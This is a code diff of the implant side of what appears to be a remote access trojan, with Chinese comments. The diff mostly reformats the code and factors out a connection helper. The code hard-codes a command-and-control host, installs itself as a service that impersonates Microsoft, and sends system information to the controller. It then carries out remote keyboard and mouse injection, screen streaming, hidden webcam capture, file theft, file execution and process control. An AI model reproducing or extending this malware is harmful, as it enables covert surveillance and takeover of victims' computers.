@@ -4,7 +4,6 @@
 #pragma comment(lib, "msvcrt.lib")
 #pragma comment(linker,"/NODEFAULTLIB:libcmt.lib")
 #pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
-//#pragma comment(linker,"/ENTRY:WinMain")
 
 #define DE
 #include "../../debug.h"
@@ -23,7 +22,7 @@
 
 struct MODIFY_DATA
 {
-    char  strIPFile[128];   //ip文件or DNS						0
+	char  strIPFile[128];   //ip文件or DNS						0
 	char  strVersion[16];   //服务端版本						128
 	DWORD dwVipID;          //VIP ID							144
 	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
@@ -34,132 +33,125 @@ struct MODIFY_DATA
 	int   ServerPort;		//Client port						481
 }modify_data =
 {
-    "botovinik.vicp.net:80",
-    "150614",
+	"botovinik.vicp.net:80",
+	"150614",
 	vipid,
 	FALSE,
-    "WinNetCenter",
-    "Microsoft(R) Multi Protocol Network Control Center",
-    "Provides supports for multi network Protocol. This service can't be stopped.",
-    "192.168.1.145",
-    80,
+	"WinNetCenter",
+	"Microsoft(R) Multi Protocol Network Control Center",
+	"Provides supports for multi network Protocol. This service can't be stopped.",
+	"192.168.1.145",
+	80,
 };
 
 SOCKET MainSocket;
 
 unsigned long _stdcall resolve(char *host)
 {
-    struct hostent *ser = NULL;
+	struct hostent *ser = NULL;
 
 	long i = inet_addr(host);
 	
-    if (i < 0) //Not Ip
-    {
+	if (i < 0) //Not Ip
+	{
 		ser = (struct hostent*)gethostbyname(host);
 
-        if (ser == NULL)
-        {
-        	ser = (struct hostent*)gethostbyname(host); //retry
-        }
+		if (ser == NULL)
+		{
+			ser = (struct hostent*)gethostbyname(host); //retry
+		}
 		
 		if (ser != NULL)
-        {
-        	return (*(unsigned long *)ser->h_addr);
-        }
+		{
+			return (*(unsigned long *)ser->h_addr);
+		}
 		
 		return 0;  
-    }
+	}
 
-    return i;
+	return i;
 }
 
 SOCKET ConnectServer(int Port, char Addr[])
 {
 	struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family = AF_INET;
-    LocalAddr.sin_port = htons(Port);
-    LocalAddr.sin_addr.S_un.S_addr = resolve(Addr);
+	LocalAddr.sin_family = AF_INET;
+	LocalAddr.sin_port = htons(Port);
+	LocalAddr.sin_addr.S_un.S_addr = resolve(Addr);
 	
-    SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0); //连接的socket
+	SOCKET hSocket = socket(AF_INET, SOCK_STREAM, 0); //连接的socket
 	
 	int timeout = 45000;
 	int err = setsockopt(hSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
 
 	if (connect(hSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
-    {
-        MsgErr("Can't Connect");
-        return NULL;//connect error
-    }
-    else
-    {
-        TurnonKeepAlive(hSocket, 120);
-    }
+	{
+		closesocket(hSocket);
+
+		return SOCKET_ERROR;
+	}
+	else
+	{
+		TurnonKeepAlive(hSocket, 120);
+	}
 
 	return hSocket;
+}
+
+inline SOCKET ConnectServer()
+{
+	return ConnectServer(modify_data.ServerPort, modify_data.ServerAddr);
 }
 
 DWORD _stdcall ConnectThread(LPVOID lParam)
 {
 	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
 
-    struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family = AF_INET;
-    LocalAddr.sin_port = htons(modify_data.ServerPort);
-    LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);
-
-    MainSocket = socket(AF_INET, SOCK_STREAM, 0); //连接的socket
+	MainSocket = ConnectServer();
 	
-	int timeout = 45000;
-	int err = setsockopt(MainSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
-  		
-    if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
-    {
-        MsgErr("Can't Connect");
-#ifndef DE
-		Sleep(30000);
-#endif
-        return 0;//connect error
-    }
-    else
-    {
-        TurnonKeepAlive(MainSocket, 120);
-    }
+	if (MainSocket == SOCKET_ERROR)
+	{
+		MsgErr("Can't Connect");
 
-    SysInfo m_SysInfo;
-    GetSystemInfo(m_SysInfo);//获取系统信息
-    m_SysInfo.iVipID = modify_data.dwVipID;
-    m_SysInfo.bVideo = true; //CVideoCap::IsWebCam();
-    lstrcpy(m_SysInfo.cVersion, modify_data.strVersion);
-    EncryptData((unsigned char *)&m_SysInfo, sizeof(SysInfo), modify_data.dwVipID);	//用产品ID号加密
+		return 0;//connect error
+	}
 
-    //send socket type
-    MsgHead msgHead;
-    char chBuffer[4096];
+	SysInfo m_SysInfo;
+	GetSystemInfo(m_SysInfo);//获取系统信息
+	m_SysInfo.iVipID = modify_data.dwVipID;
+	m_SysInfo.bVideo = true; //CVideoCap::IsWebCam();
+	lstrcpy(m_SysInfo.cVersion, modify_data.strVersion);
+	EncryptData((unsigned char *)&m_SysInfo, sizeof(SysInfo), modify_data.dwVipID);	//用产品ID号加密
 
-    msgHead.dwCmd = SOCKET_CONNECT;//填充消息
-    msgHead.dwSize = sizeof(SysInfo);
+	//send socket type
+	MsgHead msgHead;
+	char chBuffer[4096];
 
-    memcpy(chBuffer, &m_SysInfo, sizeof(SysInfo));//填充被控端信息
+	msgHead.dwCmd = SOCKET_CONNECT;//填充消息
+	msgHead.dwSize = sizeof(SysInfo);
 
-    if ( !SendMsg(MainSocket, (char *)&m_SysInfo, &msgHead) )
-    {
-        MsgErr("Can't Send");
-        closesocket(MainSocket);
-        return 1; //send socket type error
-    }
+	memcpy(chBuffer, &m_SysInfo, sizeof(SysInfo));//填充被控端信息
 
-    while (1)	//接收命令
-    {
-        if ( !RecvMsg(MainSocket, (char *)chBuffer, &msgHead))	//掉线，错误
-        {
-            MsgErr("Can't Recv");
-            shutdown(MainSocket, 0x02);
-            closesocket(MainSocket);
-            break;
-        }
+	if ( !SendMsg(MainSocket, (char *)&m_SysInfo, &msgHead) )
+	{
+		MsgErr("Can't Send");
+		closesocket(MainSocket);
+		return 1; //send socket type error
+	}
 
-        switch (msgHead.dwCmd)	//解析命令
-        {
+	while (1)	//接收命令
+	{
+		if ( !RecvMsg(MainSocket, (char *)chBuffer, &msgHead))	//掉线，错误
+		{
+			MsgErr("Can't Recv");
+			shutdown(MainSocket, 0x02);
+			closesocket(MainSocket);
+			
+			return 1;
+		}
+
+		switch (msgHead.dwCmd)	//解析命令
+		{
 			case CMD_FILEMANAGE:
 			{
 #ifdef LxFile
@@ -209,13 +201,21 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			{
 				shutdown(MainSocket, 0x02);
 				closesocket(MainSocket);
-				ExitProcess(0);
+				return -1;
 			}
 			break;
 
 			case CMD_RESTART:
 			{
-				//Todo
+				shutdown(MainSocket, 0x02);
+				closesocket(MainSocket);
+				Sleep(200);
+
+				char SelfPath[128];
+				GetModuleFileName(GetModuleHandle(NULL), SelfPath, 128);
+				WinExec(SelfPath, 0);
+
+				return -1;
 			}
 			break;
 
@@ -273,158 +273,152 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 			case CMD_KEYDOWN:	//WM_KEYDOWN
 			{
-			    //OpenUserDesktop();
-			    int nVirtKey = msgHead.dwExtend1;
-			    keybd_event((BYTE)nVirtKey, 0, 0, 0);
+				//OpenUserDesktop();
+				int nVirtKey = msgHead.dwExtend1;
+				keybd_event((BYTE)nVirtKey, 0, 0, 0);
 			}
 			break;
 
 			case CMD_KEYUP:	//WM_KEYUP
 			{
-			    //OpenUserDesktop();
+				//OpenUserDesktop();
 				int nVirtKey = msgHead.dwExtend1;
-			    keybd_event((BYTE)nVirtKey, 0, KEYEVENTF_KEYUP, 0);
+				keybd_event((BYTE)nVirtKey, 0, KEYEVENTF_KEYUP, 0);
 			}
 			break;
 
 			case CMD_MOUSEMOVE:	//WM_MOUSEMOVE
 			{
-			    //OpenUserDesktop();
-			    POINT pt;
-			    pt.x = msgHead.dwExtend1;
-			    pt.y = msgHead.dwExtend2;
-			    SetCursorPos(pt.x, pt.y);
+				//OpenUserDesktop();
+				POINT pt;
+				pt.x = msgHead.dwExtend1;
+				pt.y = msgHead.dwExtend2;
+				SetCursorPos(pt.x, pt.y);
 			}
 			break;
 
 			case CMD_LBUTTONDOWN:	//WM_LBUTTONDOWN
 			{
 				//OpenUserDesktop();
-	            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
-		    }
+				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
+			}
 			break;
 
-	        case CMD_LBUTTONUP:	//WM_LBUTTONUP
-		    {
-			    //OpenUserDesktop();
-				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
-	        }
-		    break;
-
-			case CMD_LBUTTONDBLCLK:	//WM_LBUTTONDBLCLK
-	        {
-		        //OpenUserDesktop();
-			    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
-				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
-	            mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
-		        mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
-			}
-	        break;
-
-		    case CMD_RBUTTONDOWN:	//WM_RBUTTONDOWN
+			case CMD_LBUTTONUP:	//WM_LBUTTONUP
 			{
 				//OpenUserDesktop();
-	            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
-		    }
+				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
+			}
 			break;
 
-	        case CMD_RBUTTONUP:	//WM_RBUTTONUP
-		    {
-			    //OpenUserDesktop();
+			case CMD_LBUTTONDBLCLK:	//WM_LBUTTONDBLCLK
+			{
+				//OpenUserDesktop();
+				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
+				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
+				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
+				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
+			}
+			break;
+
+			case CMD_RBUTTONDOWN:	//WM_RBUTTONDOWN
+			{
+				//OpenUserDesktop();
+				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
+			}
+			break;
+
+			case CMD_RBUTTONUP:	//WM_RBUTTONUP
+			{
+				//OpenUserDesktop();
 				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
-	        }
-		    break;
+			}
+			break;
 
 			case CMD_RBUTTONDBLCLK:	//WM_RBUTTONDBLCLK
-	        {
-		        //OpenUserDesktop();
-			    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
+			{
+				//OpenUserDesktop();
+				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
 				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
 				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
-	            mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
-		    }
+				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
+			}
 			break;
 #endif
 			default:
 				break;
-        }
-    }
+		}
+	}
 
-    return 10;
+	return 2;
 }
 
 //////////////////////////////////////////////////////////////////////////////////
 //文件管理线程
 DWORD _stdcall FileManageThread(LPVOID lParam)
 {
-    struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family=AF_INET;
-    LocalAddr.sin_port=htons(modify_data.ServerPort);
-    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);
+	SOCKET FileSocket = ConnectServer();
 
-    SOCKET FileSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (connect(FileSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
-    {
-        closesocket(FileSocket);
-        return 0;	//connect error
-    }
+	if (FileSocket == SOCKET_ERROR)
+	{
+		return 0;
+	}
 
-    //================================================================================
-    MsgHead msgHead;
-    char *chBuffer = new char[2048 * 1024]; //数据交换区
+	MsgHead msgHead;
+	char *chBuffer = new char[2048 * 1024];
 
-    //send socket type
-    msgHead.dwCmd = SOCKET_FILEMANAGE;
-    msgHead.dwSize = 0;
-    if (!SendMsg(FileSocket, chBuffer, &msgHead))
-    {
-        if (chBuffer != NULL)
-            delete []chBuffer;
+	//send socket type
+	msgHead.dwCmd = SOCKET_FILEMANAGE;
+	msgHead.dwSize = 0;
+	if (!SendMsg(FileSocket, chBuffer, &msgHead))
+	{
+		if (chBuffer != NULL)
+			delete []chBuffer;
 
-        closesocket(FileSocket);
-        return 0;//send socket type error
-    }
+		closesocket(FileSocket);
+		return 0;//send socket type error
+	}
 
-    while (1)
-    {
-        //接收命令
-        if (!RecvMsg(FileSocket, chBuffer, &msgHead))
-            break;
+	while (1)
+	{
+		//接收命令
+		if (!RecvMsg(FileSocket, chBuffer, &msgHead))
+			break;
 
-        //解析命令
-        switch (msgHead.dwCmd)
-        {
-        case CMD_FILEDRIVER://获取驱动器
+		//解析命令
+		switch (msgHead.dwCmd)
+		{
+		case CMD_FILEDRIVER://获取驱动器
 			{
 				FileListDirver(chBuffer, &msgHead);
 			}
 			break;
-        case CMD_FILEDIRECTORY:
+		case CMD_FILEDIRECTORY:
 			{
 				FileListDirectory(chBuffer, &msgHead);
 			}
 			break;
-        case CMD_FILEDELETE:
+		case CMD_FILEDELETE:
 			{
 				FileDelete(chBuffer, &msgHead);
 			}
 			break;
-        case CMD_FILEEXEC://执行
+		case CMD_FILEEXEC://执行
 			{
 				FileExec(chBuffer, &msgHead);
 			}
 			break;
-        case CMD_FILEPASTE://粘贴
+		case CMD_FILEPASTE://粘贴
 			{
 				FilePaste(chBuffer, &msgHead);
 			}
 			break;
-        case CMD_FILERENAME://重命名
+		case CMD_FILERENAME://重命名
 			{
 				FileReName(chBuffer, &msgHead);
 			}
 			break;
-        case CMD_FILEDOWNSTART://下载开始
+		case CMD_FILEDOWNSTART://下载开始
 			{
 				FileOpt m_FileOpt;
 				memcpy(&m_FileOpt, chBuffer, sizeof(m_FileOpt));
@@ -436,7 +430,7 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 				msgHead.dwSize = 0;
 			}
 			break;
-        case CMD_FILEUPSTART://上传开始
+		case CMD_FILEUPSTART://上传开始
 			{
 				FileOpt m_FileOpt;
 				memcpy(&m_FileOpt,chBuffer,sizeof(m_FileOpt));
@@ -448,93 +442,86 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 				msgHead.dwSize = 0;
 			}
 			break;
-        default:
+		default:
 			{
 				msgHead.dwCmd = CMD_INVALID;
 				msgHead.dwSize = 0;
 			}
-        break;
-        }
+		break;
+		}
 
-        //发送数据
-        if (!SendMsg(FileSocket, chBuffer, &msgHead))
-            break;
-    }
+		//发送数据
+		if (!SendMsg(FileSocket, chBuffer, &msgHead))
+			break;
+	}
 
-    if (chBuffer != NULL)
-        delete[] chBuffer;
+	if (chBuffer != NULL)
+		delete[] chBuffer;
 
 	shutdown(FileSocket, 0);
-    closesocket(FileSocket);
-    return 0;
+	closesocket(FileSocket);
+	return 0;
 }
 
 DWORD _stdcall ScreenThread(LPVOID lParam)
 {	
-    DWORD dwSock = (DWORD)lParam;
+	DWORD dwSock = (DWORD)lParam;
 
-    struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family = AF_INET;
-    LocalAddr.sin_port = htons(modify_data.ServerPort);
-    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);
+	SOCKET ScreenSocket = ConnectServer();
+	
+	if (ScreenSocket == SOCKET_ERROR)
+	{
+		return 0;
+	}
+	
+	//设置发送缓冲区,有利于屏幕传输
+	int rcvbuf = 65536; //64KB
+	int rcvbufsize = sizeof(int);
+	setsockopt(ScreenSocket, SOL_SOCKET,SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
+	int bNodelay = 1;
+	setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法   
 
-    //屏幕监控的socket
-    SOCKET ScreenSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (connect(ScreenSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
-    {
-        return 0;	//connect error
-    }
-    else
-    {
-        //设置发送缓冲区,有利于屏幕传输
-        int rcvbuf = 65536; //64KB
-        int rcvbufsize = sizeof(int);
-        setsockopt(ScreenSocket, SOL_SOCKET,SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
-        int bNodelay = 1;
-        setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法   
-    }
+	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
 
-    SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
-
-    MsgHead msgHead;
-    int nColor = 8;
-    //send socket type
-    msgHead.dwCmd = SOCKET_SCREEN;
-    msgHead.dwSize = 0;
-    msgHead.dwExtend1 = dwSock;
-    if (!SendMsg(ScreenSocket, NULL, &msgHead) || !RecvMsg(ScreenSocket, NULL, &msgHead) )//Get Screen Color
-    {
+	MsgHead msgHead;
+	int nColor = 8;
+	//send socket type
+	msgHead.dwCmd = SOCKET_SCREEN;
+	msgHead.dwSize = 0;
+	msgHead.dwExtend1 = dwSock;
+	if (!SendMsg(ScreenSocket, NULL, &msgHead) || !RecvMsg(ScreenSocket, NULL, &msgHead) )//Get Screen Color
+	{
 		shutdown(ScreenSocket,0);
-        closesocket(ScreenSocket);
-        return 0;//send socket type error
-    }
-    else
-    {
-        nColor = msgHead.dwExtend1;
-    }
+		closesocket(ScreenSocket);
+		return 0;//send socket type error
+	}
+	else
+	{
+		nColor = msgHead.dwExtend1;
+	}
 
-    ////////////////////////////////////////
-    XScreenXor m_ScreenXor;
-    m_ScreenXor.SetColor(nColor);//设置位图颜色
-    m_ScreenXor.InitGlobalVar();
+	////////////////////////////////////////
+	XScreenXor m_ScreenXor;
+	m_ScreenXor.SetColor(nColor);//设置位图颜色
+	m_ScreenXor.InitGlobalVar();
 
-    msgHead.dwCmd = SOCKET_SCREEN;
-    msgHead.dwSize = 0;
-    msgHead.dwExtend1 = m_ScreenXor.GetBmpSize();
-    msgHead.dwExtend2 = m_ScreenXor.GetInfoSize();
-    //发送位图信息
-    if (!SendMsg(ScreenSocket, NULL, &msgHead))
-    {
+	msgHead.dwCmd = SOCKET_SCREEN;
+	msgHead.dwSize = 0;
+	msgHead.dwExtend1 = m_ScreenXor.GetBmpSize();
+	msgHead.dwExtend2 = m_ScreenXor.GetInfoSize();
+	//发送位图信息
+	if (!SendMsg(ScreenSocket, NULL, &msgHead))
+	{
 		shutdown(ScreenSocket,0);
-        closesocket(ScreenSocket);
-        return 0;//send socket type error
-    }
+		closesocket(ScreenSocket);
+		return 0;//send socket type error
+	}
 
-    DWORD dwFrameID = 0, dwLastSend;
-    BOOL  bNotStop = TRUE;
-    DWORD lenthUncompress = m_ScreenXor.GetBmpSize();
-    DWORD lenthCompress = compressBound(lenthUncompress); //(DWORD)((lenthUncompress+12)*1.1);
-    BYTE* pDataCompress = new BYTE [lenthCompress];
+	DWORD dwFrameID = 0, dwLastSend;
+	BOOL  bNotStop = TRUE;
+	DWORD lenthUncompress = m_ScreenXor.GetBmpSize();
+	DWORD lenthCompress = compressBound(lenthUncompress); //(DWORD)((lenthUncompress+12)*1.1);
+	BYTE* pDataCompress = new BYTE [lenthCompress];
 
 	///////////////////////first///////////////////////////
 	dwLastSend = GetTickCount();
@@ -551,132 +538,127 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 	
 	bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);
 
-    while (bNotStop)
-    {
-        dwLastSend = GetTickCount();
+	while (bNotStop)
+	{
+		dwLastSend = GetTickCount();
 
-        lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
-        m_ScreenXor.CaputreFrameNext(dwFrameID);
-        Sleep(15);
-        ::compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);
+		lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
+		m_ScreenXor.CaputreFrameNext(dwFrameID);
+		Sleep(15);
+		::compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);
 
-        msgHead.dwCmd     = dwFrameID++;              //当前帧号
-        msgHead.dwSize    = lenthCompress;            //传输的数据长度
-        msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //原始长度
-        msgHead.dwExtend2 = lenthCompress;            //压缩后长度
+		msgHead.dwCmd     = dwFrameID++;              //当前帧号
+		msgHead.dwSize    = lenthCompress;            //传输的数据长度
+		msgHead.dwExtend1 = m_ScreenXor.GetBmpSize(); //原始长度
+		msgHead.dwExtend2 = lenthCompress;            //压缩后长度
 
-        bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead); //发送数据
+		bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead); //发送数据
 
-        if ((GetTickCount() - dwLastSend) < 160)
-            Sleep(150);
-    }
+		if ((GetTickCount() - dwLastSend) < 160)
+			Sleep(150);
+	}
 
-    //Release Mem and Handle
+	//Release Mem and Handle
 	shutdown(ScreenSocket,0);
-    closesocket(ScreenSocket);
-    delete [] pDataCompress;
+	closesocket(ScreenSocket);
+	delete [] pDataCompress;
 
-    return 0;
+	return 0;
 }
 
 #ifdef LxVideo
 DWORD _stdcall VideoThread(LPVOID lParam)
 {
-    struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family=AF_INET;
-    LocalAddr.sin_port=htons(modify_data.ServerPort);
-    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);
+	SOCKET VideoSocket = ConnectServer();
+	if (VideoSocket == SOCKET_ERROR)
+	{
+		return 0;//connect error
+	}
+	else
+	{
+		//设置发送缓冲区,有利于视频传输
+		int rcvbuf = 65536; //64KB
+		int rcvbufsize = sizeof(int);
+		setsockopt(VideoSocket, SOL_SOCKET, SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
+		int bNodelay = 1;
+		setsockopt(VideoSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法   
+	}
 
-    SOCKET VideoSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (connect(VideoSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
-    {
-        return 0;//connect error
-    }
-    else
-    {
-        //设置发送缓冲区,有利于视频传输
-        int rcvbuf = 65536; //64KB
-        int rcvbufsize = sizeof(int);
-        setsockopt(VideoSocket, SOL_SOCKET, SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
-        int bNodelay = 1;
-        setsockopt(VideoSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法   
-    }
-
-    //==================================================================
-    MsgHead msgHead;
-    //send socket type
-    msgHead.dwCmd = SOCKET_VIDEOCAP;
-    msgHead.dwSize = 0;
-    if (!SendMsg(VideoSocket, NULL, &msgHead))
-    {
+	//==================================================================
+	MsgHead msgHead;
+	//send socket type
+	msgHead.dwCmd = SOCKET_VIDEOCAP;
+	msgHead.dwSize = 0;
+	if (!SendMsg(VideoSocket, NULL, &msgHead))
+	{
 		shutdown(VideoSocket,0);
-        closesocket(VideoSocket);
-        return 0;//send socket type error
-    }
+		closesocket(VideoSocket);
+		return 0;//send socket type error
+	}
 
-    ///////////////////////////////////////////////
-    //Send BITMAPINFO or error code
-    if (!CVideoCap::IsWebCam())    //设备不存在或正在使用
-    {
-        msgHead.dwCmd = 1;
-        msgHead.dwSize = 0;
-        SendMsg(VideoSocket, NULL, &msgHead);
-        shutdown(VideoSocket,0x02);
-        closesocket(VideoSocket);
-        return 1;//send socket type error
-    }
+	///////////////////////////////////////////////
+	//Send BITMAPINFO or error code
+	if (!CVideoCap::IsWebCam())    //设备不存在或正在使用
+	{
+		msgHead.dwCmd = 1;
+		msgHead.dwSize = 0;
+		SendMsg(VideoSocket, NULL, &msgHead);
+		shutdown(VideoSocket,0x02);
+		closesocket(VideoSocket);
+		return 1;//send socket type error
+	}
 
-    CVideoCap m_Cap;
-    if (!m_Cap.Initialize())   //设备初始化失败
-    {
-        msgHead.dwCmd = 2;
-        msgHead.dwSize = 0;
-        SendMsg(VideoSocket, NULL, &msgHead);
-        shutdown(VideoSocket,0x02);
-        closesocket(VideoSocket);
-        return 2;
-    }
+	CVideoCap m_Cap;
+	if (!m_Cap.Initialize())   //设备初始化失败
+	{
+		msgHead.dwCmd = 2;
+		msgHead.dwSize = 0;
+		SendMsg(VideoSocket, NULL, &msgHead);
+		shutdown(VideoSocket,0x02);
+		closesocket(VideoSocket);
+		return 2;
+	}
 
-    msgHead.dwCmd  = 0;
-    msgHead.dwSize = sizeof(BITMAPINFOHEADER);
-    if (!SendMsg(VideoSocket, (char*)&(m_Cap.m_lpbmi->bmiHeader), &msgHead))
-    {
-    	shutdown(VideoSocket,0);
-        closesocket(VideoSocket);
-        return 3;//send socket type error
-    }
+	msgHead.dwCmd  = 0;
+	msgHead.dwSize = sizeof(BITMAPINFOHEADER);
+	if (!SendMsg(VideoSocket, (char*)&(m_Cap.m_lpbmi->bmiHeader), &msgHead))
+	{
+		shutdown(VideoSocket,0);
+		closesocket(VideoSocket);
+		return 3;//send socket type error
+	}
 
-    DWORD dwFrameID = 0,dwLastSend;
-    BOOL  bNotStop = TRUE;
-    DWORD lenthUncompress = m_Cap.m_lpbmi->bmiHeader.biSizeImage - 5;//为啥-5？？
-    DWORD lenthCompress = (unsigned long)((lenthUncompress+12)*1.1);
-    BYTE* pDataCompress = new BYTE [lenthCompress];
+	DWORD dwFrameID = 0,dwLastSend;
+	BOOL  bNotStop = TRUE;
+	DWORD lenthUncompress = m_Cap.m_lpbmi->bmiHeader.biSizeImage - 5;//为啥-5？？
+	DWORD lenthCompress = (unsigned long)((lenthUncompress+12)*1.1);
+	BYTE* pDataCompress = new BYTE [lenthCompress];
 
-    while (bNotStop)
-    {
-        dwLastSend = GetTickCount();//被卡巴杀
+	while (bNotStop)
+	{
+		dwLastSend = GetTickCount();//被卡巴杀
 
-        lenthCompress = (unsigned long)((lenthUncompress+12)*1.1);                   //这个不能少
-        ::compress(pDataCompress,                                   //压缩数据
-                   &lenthCompress,
-                   (BYTE*)m_Cap.GetDIB(),
-                   lenthUncompress);
+		lenthCompress = (unsigned long)((lenthUncompress+12)*1.1);                   //这个不能少
+		::compress(pDataCompress,                                   //压缩数据
+				   &lenthCompress,
+				   (BYTE*)m_Cap.GetDIB(),
+				   lenthUncompress);
 
-        msgHead.dwCmd     = dwFrameID++;            //帧号
-        msgHead.dwSize    = lenthCompress;          //传输的数据长度
-        msgHead.dwExtend1 = lenthUncompress;        //未压缩数据长度
-        msgHead.dwExtend2 = lenthCompress;          //压缩后数据长度
+		msgHead.dwCmd     = dwFrameID++;            //帧号
+		msgHead.dwSize    = lenthCompress;          //传输的数据长度
+		msgHead.dwExtend1 = lenthUncompress;        //未压缩数据长度
+		msgHead.dwExtend2 = lenthCompress;          //压缩后数据长度
 
-        bNotStop = SendMsg(VideoSocket, (char*)pDataCompress, &msgHead); //发送数据
+		bNotStop = SendMsg(VideoSocket, (char*)pDataCompress, &msgHead); //发送数据
 
-        if ((GetTickCount() - dwLastSend) < 100)
-            Sleep(80);
-    }
+		if ((GetTickCount() - dwLastSend) < 100)
+			Sleep(80);
+	}
 
-    if (pDataCompress != NULL)
-        delete[] pDataCompress;
+	if (pDataCompress != NULL)
+		delete[] pDataCompress;
 
-    return 10;
+	return 10;
 }
 #endif
 
@@ -684,288 +666,257 @@ DWORD _stdcall VideoThread(LPVOID lParam)
 //进程管理线程
 DWORD _stdcall ProcessThread(LPVOID lParam)
 {
-    struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family=AF_INET;
-    LocalAddr.sin_port=htons(modify_data.ServerPort);
-    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);
+	SOCKET ProcessSocket = ConnectServer();
+	if (ProcessSocket == SOCKET_ERROR)	//connect error
+	{
+		return 0;
+	}
 
-    SOCKET ProcessSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (connect(ProcessSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)	//connect error
-    {
-    	shutdown(ProcessSocket,0x02);
-        closesocket(ProcessSocket);
-        return 0;
-    }
+	MsgHead msgHead;
+	char chBuffer[32 * 1024]; //数据交换区
 
-    //================================================================================
-    MsgHead msgHead;
-    char chBuffer[32 * 1024]; //数据交换区
-
-    //send socket type
-    msgHead.dwCmd = SOCKET_PROCESS;
-    msgHead.dwSize = 0;
-    if (!SendMsg(ProcessSocket, chBuffer, &msgHead))
-    {
+	//send socket type
+	msgHead.dwCmd = SOCKET_PROCESS;
+	msgHead.dwSize = 0;
+	if (!SendMsg(ProcessSocket, chBuffer, &msgHead))
+	{
 		shutdown(ProcessSocket,0);
-        closesocket(ProcessSocket);
-        return 0;//send socket type error
-    }
+		closesocket(ProcessSocket);
+		return 0;//send socket type error
+	}
 
-    while (1)	//接收命令
-    {
-        if (!RecvMsg(ProcessSocket, chBuffer, &msgHead))
-            break;
+	while (1)	//接收命令
+	{
+		if (!RecvMsg(ProcessSocket, chBuffer, &msgHead))
+			break;
 
-        switch (msgHead.dwCmd)	//解析命令
-        {
-        	case CMD_PROCESSLIST:
-        	{
